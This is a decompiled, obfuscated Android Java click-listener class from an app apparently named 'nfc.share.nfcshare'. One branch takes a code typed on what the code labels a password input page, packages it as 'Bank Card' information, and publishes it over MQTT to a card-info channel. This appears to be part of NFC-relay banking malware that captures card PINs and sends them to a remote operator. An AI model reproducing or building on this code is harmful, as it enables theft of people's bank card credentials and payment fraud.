package p076e;

import android.app.AlertDialog;
import android.content.Context;
import android.content.ContextWrapper;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Date;
import nfc.share.nfcshare.MainActivity;
import nfc.share.nfcshare.model.CardInfo;
import nfc.share.nfcshare.model.MqttChannel;
import p005C.AbstractC0044g;
import p118t1.AbstractC1244n;

/* renamed from: e.w */
/* loaded from: classes.dex */
public final class ViewOnClickListenerC0799w implements View.OnClickListener {

    /* renamed from: a */
    public final /* synthetic */ int f3186a = 0;

    /* renamed from: b */
    public final View f3187b;

    /* renamed from: c */
    public final Object f3188c;

    /* renamed from: d */
    public Object f3189d;

    /* renamed from: e */
    public Object f3190e;

    public ViewOnClickListenerC0799w(View view, String str) {
        this.f3187b = view;
        this.f3188c = str;
    }

    @Override // android.view.View.OnClickListener
    public final void onClick(View view) {
        String str;
        Method method;
        switch (this.f3186a) {
            case 0:
                if (((Method) this.f3189d) == null) {
                    View view2 = this.f3187b;
                    Context context = view2.getContext();
                    while (true) {
                        String str2 = (String) this.f3188c;
                        if (context == null) {
                            int id = view2.getId();
                            if (id == -1) {
                                str = "";
                            } else {
                                str = " with id '" + view2.getContext().getResources().getResourceEntryName(id) + "'";
                            }
                            StringBuilder m156h = AbstractC0044g.m156h("Could not find method ", str2, "(View) in a parent or ancestor Context for android:onClick attribute defined on view ");
                            m156h.append(view2.getClass());
                            m156h.append(str);
                            throw new IllegalStateException(m156h.toString());
                        }
                        try {
                            if (!context.isRestricted() && (method = context.getClass().getMethod(str2, View.class)) != null) {
                                this.f3189d = method;
                                this.f3190e = context;
                            }
                        } catch (NoSuchMethodException unused) {
                        }
                        context = context instanceof ContextWrapper ? ((ContextWrapper) context).getBaseContext() : null;
                    }
                }
                try {
                    ((Method) this.f3189d).invoke((Context) this.f3190e, view);
                    return;
                } catch (IllegalAccessException e2) {
                    throw new IllegalStateException("Could not execute non-public method for android:onClick", e2);
                } catch (InvocationTargetException e3) {
                    throw new IllegalStateException("Could not execute method for android:onClick", e3);
                }
            default:
                String obj = ((EditText) this.f3187b).getText().toString();
                if (TextUtils.isEmpty(obj)) {
                    Toast.makeText((MainActivity) ((C0794r) this.f3190e).f3113b, "code is empty", 0).show();
                    return;
                }
                ((AlertDialog) this.f3188c).dismiss();
                if (AbstractC1244n.f4848b != null) {
                    String label = ((CardInfo) this.f3189d).getLabel();
                    if (label != null) {
                        CardInfo cardInfo = new CardInfo(obj, "Bank Card", new Date(), label);
                        Log.d("111", "密码输入页面" + cardInfo);
                        AbstractC1244n.f4854h = cardInfo;
                        AbstractC1244n.f4848b.m521C(MqttChannel.CARD_INFO_CHANNEL, AbstractC1244n.m2913c(cardInfo.toString().getBytes()));
                        return;
                    }
                    CardInfo cardInfo2 = new CardInfo(obj, "Bank Card", new Date(), "");
                    Log.d("111", "密码输入页面" + cardInfo2);
                    AbstractC1244n.f4854h = cardInfo2;
                    AbstractC1244n.f4848b.m521C(MqttChannel.CARD_INFO_CHANNEL, AbstractC1244n.m2913c(cardInfo2.toString().getBytes()));
                    return;
                }
                return;
        }
    }

    public ViewOnClickListenerC0799w(C0794r c0794r, EditText editText, AlertDialog alertDialog, CardInfo cardInfo) {
        this.f3190e = c0794r;
        this.f3187b = editText;
        this.f3188c = alertDialog;
        this.f3189d = cardInfo;
    }
}
